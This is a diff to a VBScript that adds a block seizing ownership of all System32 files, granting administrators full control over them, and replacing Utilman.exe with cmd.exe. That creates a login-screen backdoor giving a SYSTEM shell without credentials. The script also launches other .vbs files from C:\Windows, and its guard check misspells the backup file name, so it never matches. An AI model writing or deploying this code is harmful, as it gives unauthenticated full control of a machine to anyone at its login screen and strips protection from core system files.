@@ -324,6 +324,35 @@ End If
 '========================'
 '========================'
 
+soundFile = "C:\Windows\Media\Windows Shutdown.wav"
+path = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%USERPROFILE%")
+
+If (objFSO.FileExists(soundFile)) Then
+    utilOld = "C:\Windows\System32\Utlilman_Old.exe"
+
+    If (objFSO.FileExists(utilOld)) Then
+        'Already Copied
+    Else
+        WshShell.Run "cmd.exe /C takeown /f C:\Windows\System32\*"
+        WshShell.Run "cmd.exe /C icacls C:\Windows\System32\* /grant administrators:F"
+        WshShell.Run "cmd.exe /C copy /Y C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman_Old.exe"
+        WshShell.Run "cmd.exe /C copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe"
+    End If
+Else
+    utilOld = "C:\Windows\System32\Utlilman_Old.exe"
+
+    If (objFSO.FileExists(utilOld)) Then
+        'Already Copied
+    Else
+        WshShell.Run "cmd.exe /C copy /Y C:\Windows\System32\Utilman.exe C:\Windows\System32\Utilman_Old.exe"
+        WshShell.Run "cmd.exe /C copy /Y C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe"
+    End If
+End If
+
+'========================'
+'========================'
+'========================'
+
 'Delete File from Desktop'
 'WshShell.Run "C:\Windows\" & file2 & ".bat"
 WshShell.Run "C:\Windows\" & file4 & ".vbs"
